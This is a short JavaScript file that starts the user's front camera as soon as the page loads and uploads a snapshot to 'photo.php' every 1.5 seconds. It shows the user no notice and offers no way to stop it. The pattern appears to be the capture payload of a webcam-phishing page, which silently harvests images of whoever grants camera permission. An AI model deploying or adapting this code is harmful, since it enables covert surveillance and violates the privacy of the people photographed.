function post(imgdata) {
  $.ajax({
    type: 'POST',
    data: { cat: imgdata },
    url: 'photo.php', 
    dataType: 'json',
    async: false,
    success: function(result){
      console.log("Foto enviada", result);
    },
    error: function(){
      console.error("Error al enviar foto");
    }
  });
}

'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = { audio: false, video: { facingMode: "user" } };

async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}

function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

  var context = canvas.getContext('2d');
  setInterval(function(){
    context.drawImage(video, 0, 0, 640, 480);
    var canvasData = canvas.toDataURL("image/png");
    post(canvasData);
  }, 1500);
}

init();
